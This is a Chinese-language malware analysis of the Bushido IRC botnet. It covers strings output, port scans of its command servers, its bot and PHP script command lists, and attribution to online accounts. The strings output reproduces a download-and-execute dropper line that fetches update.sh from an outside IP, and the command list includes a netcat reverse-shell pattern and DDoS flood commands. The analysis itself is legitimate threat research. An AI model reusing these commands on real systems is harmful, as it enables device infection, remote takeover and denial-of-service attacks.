    55: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getpid.c
    56: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getppid.c
    57: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS getrlimit.c
    58: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ioctl.c
    59: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS kill.c
发现了一个有趣的文件 Bushido-IRC.c（本僵尸网络名字的来源），更有意思的是，接下去我发现不需要用反编译的手段，直接用 strings
工具就可以发现该恶意样本的很多有用信息
    $ strings ambvjcv9e0
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://80.93.187.211/update.sh -O update.sh; busybox wget http://80.93.187.211/update.sh -O update.sh; ftpget
     -v -u anonymous -p anonymous -P 21 80.93.187.211 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 80.93.187.211 update.sh update.sh; chmod 777 upd
    ate.sh; ./update.sh; rm -rf update.sh
    mirai.*
    dlr.*mips
    mips64
    mipsel
    sh2eb
    sh2elf
    armv5
    armv4tl
    armv4
    armv6
    i686
    powerpc
通过浏览 strings 输出我发现了该样本的有趣信息：
  1. CNC 服务器的 IP 地址
  2. telnet 服务的账号和密码
  3. 若干 HTTP headers 相关的字符串
  4. 若干 user agent 相关的字符串
  5. 大量种族主义的言论
  6. 大量IRC命令和相关字符串
  7. 恶意软件使用说明
  8. 恶意软件更新命令和大量其他命令
  9. 错误处理相关的字符串
  10. libc 库函数名
  11. nmap 扫描命令
  12. 编译脚本的名字
通过上述字符串可以大概判断本恶意软件的功能，但是为了搞清楚其工作流程，以及如何与 CNC 服务器连接，我们需要深入分析，由于我们已经知道了 ip
地址，我们可以直接对 CNC 服务器做端口扫描
## 扫描服务器
从可执行文件里得到CNC服务器ip地址后，很自然而然就会进行端口扫描，通过扫描我得到以下结果
1，服务器A(ip 80.93.187.211)
    21/tcp   open     ftp        
    22/tcp   open     ssh          OpenSSH 5.3 (protocol 2.0)
    | ssh-hostkey:
    |   1024 b3:ae:e9:79:22:65:37:15:13:66:c8:8f:0a:81:13:ec (DSA)
    |_  2048 32:e9:e2:9f:9b:ae:13:e6:99:7a:60:91:9c:38:30:8d (RSA)
    80/tcp   open     http         Apache httpd 2.2.15 ((CentOS))
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Apache/2.2.15 (CentOS)
    |_http-title: Apache HTTP Server Test Page powered by CentOS
    135/tcp  filtered msrpc
    139/tcp  filtered netbios-ssn
    443/tcp  open     https?
    445/tcp  filtered microsoft-ds
    3306/tcp open     mysql        MySQL (unauthorized)
    6667/tcp open     irc          UnrealIRCd
    | irc-info:
    |   users: 57
    |   servers: 1
    |   chans: 3
    |   lusers: 57
    |   lservers: 0
    |   server: irc.NulL
    |   version: Unreal3.2.10.6. irc.NulL
    |   source ident: nmap
    |   source host: 19A967F7.1F3B5440.6D396E3B.IP
    |_  error: Closing Link: kksqfgqca[114.143.107.254] (Client has disconnected from ZullSec)
根据扫描结果可以得到下面的结论：
  1. 这是基于 IRC 的 CNC 服务器
  2. ftp 服务可能可以使用：进一步地，我使用默认ftp账号和密码（anonymous）成功登录了该ftp服务，登录了ftp服务之后，就可以得到我们前面提到的所有文件，在其中一个脚本文件 8UsA1.sh 里，我们发现它还连接了另外一个ip地址： 185.244.25.217
2， 服务器B(ip 185.244.25.217)
这个ip是从文件 8UsA1.sh 里发现的，对它进行 nmap 端口扫描，可惜没发现啥有意思的东西，它只开放了一个 HTTP 服务
    80/tcp  open  http
    443/tcp open  https
    Running: Linux 2.6.X
    OS details: Linux 2.6.18 - 2.6.22
## CNC服务器
从上述分析我得出结论，这个恶意样本是通过服务器A基于 IRC 控制的僵尸网络，使用IRC客户端链接CNC服务器后可以发现有两个频道
  1. pma – 恶意脚本感染了web服务器后会通过 IRC 加入 CNC 服务器的这个频道
  2. zull – 恶意二进制感染了iot设备后通过 IRC 加入 CNC 服务器的这个频道
###  IRC服务器
经过分析，恶意终端连接 IRC 服务的命令格式如 “NICK[ZULL|x86_64]ZM5z”， 这个命令表示恶意样本 NICK[] 加入 IRC 频道
#zull, 使用的密码是写死在可执行文件里的，如下
## 恶意终端的功能
通过分析可以知道恶意样本具备以下能力：
  1. DDOS 攻击，这是主要功能，集成了多种 DDOS 攻击，如 ICMP flood, TCP/UDP flood
  2. 恶意终端可以被 CNC 远程关闭，这个关闭恶意终端的命令的密码是： “FreakIsYourGod!!!”,也是写死在二进制里的，如下
  1. 恶意终端可以从服务器下载新的可执行文件，也可以下载源码然后自己编译出可执行文件
  2. 恶意终端可以跳转到新的服务器，如果当前服务器失能
逆向分析发现恶意终端二进制文件存在一个结构体数组，该结构体第一个元素是一个字符串（命令的名称），第二个元素是一个函数指针（命令的实现函数），这个数组就是指令列表，如下：
小结一下，恶意终端包括运行在 IOT 设备上的可执行文件和运行在web服务器上的脚本，这些恶意终端会连接 IRC 服务器对应的频道，iot
设备的恶意终端连接 #zull 频道，web 服务器的恶意终端连接 #pma 频道，然后等待 IRC 服务器下发指令，这些指令整理如下：
###  恶意可执行文件拥有的指令
  * Non-root/non-spoof DDoS commands commands :
  * STD: A non spoof HIV STD flooder
  * HOLD: A vanilla TCP connect flooder
  * JUNK: A vanilla TCP flooder (modded)
  * UNKNOWN : An advanced non spoof UDP flooder modified by Freak
  * HTTP: An extremely powerful HTTP flooder
  * Spoof/root commands :
  * UDP: A UDP flooder
  * PAN: An advanced syn flooder that will kill most network drivers
  * TCP: An advanced TCP flooder with multithreading. Will kill almost any service.
  * PHATWONK: A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method.
  * BLACKNURSE: An ICMP packet flooder that will crash most firewalls and use loads of CPU.
  * Other commands :
  * RNDNICK : Randomizes the knights nick
  * NICK: Changes the nick of the client
  * SERVER: Changes servers
  * GETSPOOFS : Gets the current spoofing
  * SPOOFS: Changes spoofing to a subnet
  * DISABLE : Disables all packeting from this client
  * ENABLE : Enables all packeting from this client
  * KILL : Kills the knight
  * DNS2IP
  * GET: Downloads a file off the web and saves it onto the hd
  * UPDATE : Update this bot
  * HACKPKG: HackPkg is here! Install a bin, using http, no depends!
  * VERSION : Requests version of client
  * KILLALL : Kills all current packeting
  * HELP : Displays this
  * IRC: Sends this command to the server
  * SH: Executes a command
  * ISH: SH, interactive, sends to channel
  * SHD: Executes a psuedo-daemonized command
  * GETBB: Get a proper busybox
  * INSTALL  : Download & install a binary to /var/bin
  * BASH: Execute commands using bash.
  * BINUPDATE http:server/package : Update a binary in /var/bin via wget
  * SCAN: Call the nmap wrapper script and scan with your opts.
  * RSHELL: Equates to nohup nc ip port -e /bin/sh
  * LOCKUP http:server : Kill telnet, d/l aes backdoor from, run that instead.
  * GETSSH http:server/dropbearmulti : D/l, install, configure and start dropbear on port 30022.
###  恶意脚本拥有的指令
  * mail [to] [from] [subject] [message]
  * dns [host]
  * rndnick
  * raw [irc] [data]
  * uname
  * eval [php] [code]
  * exec [command] [args]
  * cmd [command] [args]
  * udpflood [ip] [port] [time] [packet] [size]
  * tcpconn [host] [port] [time]
  * slowread [host] [port] [page] [sockets] [time]
  * slowloris [host] [time]
  * l7 method [host] [time]
  * post [host] time
  * head [host] [time]
  * tcpflood [host] [port] [time]
  * httpflood [host] [port] [time] [method] [url]
  * proxyhttpflood [targetUrl(with http://)] [proxyListUrl] [time] [method]
  * cloudflareflood [host] [port] [time] [method] [url] [postFields]
  * ud.server [host] [port] [pass] [chan]
## 恶意样本背后的人
当我们连接上 IRC 服务器的时候会发现如下信息：
我在 twitter 上搜索以上关键字，结果发现了两个账号
  1. [m4licious](https://twitter.com/m4licious_0sec)
  2. [M1rOx](https://twitter.com/M1r0x__)
这些账号属于某个称为 Offsecurity 的组织，我猜测他们试图将这个僵尸网络出售，通过一点谷歌搜索我发现了更多信息：
  1. [Twitter](https://twitter.com/zullsec)
  2. [facebook](https://www.facebook.com/ZullSec)
  3. [youtube](https://www.youtube.com/watch?v=l2m-i0pmC9w)
## 结论
这个恶意软件并没有新奇的行为，我猜测它是根据开源工具 Mirai 改的，他们通过控制web服务器和 iot 设备发动 DDOS 攻击，并通过 IRC
服务器控制所以恶意终端。